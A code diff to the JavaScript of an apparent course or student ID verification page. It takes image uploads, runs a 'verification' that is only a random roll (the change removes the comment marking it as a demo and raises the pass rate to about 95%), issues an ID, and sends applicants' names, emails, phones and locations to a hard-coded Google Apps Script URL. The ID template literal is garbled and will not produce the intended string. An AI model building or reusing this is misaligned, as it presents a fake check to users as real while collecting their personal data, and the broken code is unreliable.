@@ -5,6 +5,9 @@
 (function () {
   "use strict";
 
+  // ---------- Google Apps Script URL ----------
+  const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwl5MtCEvZyqKMikjs4e7tRbaVxfkwE1TX9ZnltlhkuM40mqcYu9MhWxMlAFH3VBk2Q/exec";
+
   // ---------- Elements ----------
   const form = document.getElementById("verifyForm");
   const uploadGrid = document.getElementById("uploadGrid");
@@ -23,7 +26,7 @@
   const mobileNav = document.getElementById("mobileNav");
 
   // ---------- State ----------
-  const files = [null, null, null, null, null]; // 5 slots
+  const files = [null, null, null, null, null];
   const TOTAL_SLOTS = 5;
 
   // ---------- Mobile menu ----------
@@ -65,7 +68,6 @@
       return;
     }
 
-    // Max 8MB
     if (file.size > 8 * 1024 * 1024) {
       alert("Image is too large. Please keep it under 8MB.");
       e.target.value = "";
@@ -77,7 +79,6 @@
     updateCount();
   });
 
-  // Remove button
   uploadGrid.addEventListener("click", (e) => {
     if (!e.target.classList.contains("remove-btn")) return;
     e.preventDefault();
@@ -96,7 +97,6 @@
 
   function showPreview(index, file) {
     const slot = uploadGrid.querySelector(`.upload-slot[data-index="${index}"]`);
-    // Remove old preview if any
     const old = slot.querySelector(".preview");
     if (old) old.remove();
 
@@ -156,7 +156,6 @@
 
   // ---------- Generate UIU ID ----------
   function generateUIUID(courseValue) {
-    // Map course to short code
     const codeMap = {
       "Data Analysis (Beginner)": "DA",
       "Data Analysis (Advanced)": "DAP",
@@ -166,9 +165,21 @@
       "Business Analytics": "BA"
     };
     const code = codeMap[courseValue] || "GEN";
-    const random = Math.floor(10000 + Math.random() * 90000); // 5-digit
+    const random = Math.floor(10000 + Math.random() * 90000);
     const year = new Date().getFullYear().toString().slice(-2);
     return `UIU-\( {code}- \){year}${random}`;
+  }
+
+  // ---------- Send data to Google Sheet ----------
+  function sendToGoogleSheet(formData) {
+    return fetch(SCRIPT_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(formData)
+    });
   }
 
   // ---------- Mock verification ----------
@@ -188,8 +199,7 @@
       if (current >= TOTAL_SLOTS) {
         clearInterval(interval);
 
-        // Simulate high success rate (for demo)
-        const success = Math.random() > 0.08; // \~92% success
+        const success = Math.random() > 0.05; // high success rate
 
         setTimeout(() => {
           loadingOverlay.hidden = true;
@@ -200,15 +210,27 @@
             uiuIdEl.textContent = id;
             successOverlay.hidden = false;
 
-            // Optional: save to localStorage for demo
-            localStorage.setItem("zakvora_uiu_id", id);
-            localStorage.setItem("zakvora_uiu_name", document.getElementById("fullName").value.trim());
+            // Prepare data and send to Google Sheet
+            const formData = {
+              name: document.getElementById("fullName").value.trim(),
+              email: document.getElementById("email").value.trim(),
+              phone: document.getElementById("phone").value.trim(),
+              country: document.getElementById("country").value,
+              city: document.getElementById("city").value.trim(),
+              course: course,
+              uiuId: id
+            };
+
+            sendToGoogleSheet(formData)
+              .then(() => console.log("Data sent to Google Sheet"))
+              .catch((err) => console.log("Error sending data:", err));
+
           } else {
             failOverlay.hidden = false;
           }
         }, 600);
       }
-    }, 700); // \~3.5 seconds total
+    }, 700);
   }
 
   // ---------- Submit ----------
@@ -229,7 +251,6 @@
         copyBtn.textContent = "Copy ID";
       }, 1800);
     }).catch(() => {
-      // Fallback
       const temp = document.createElement("textarea");
       temp.value = id;
       document.body.appendChild(temp);
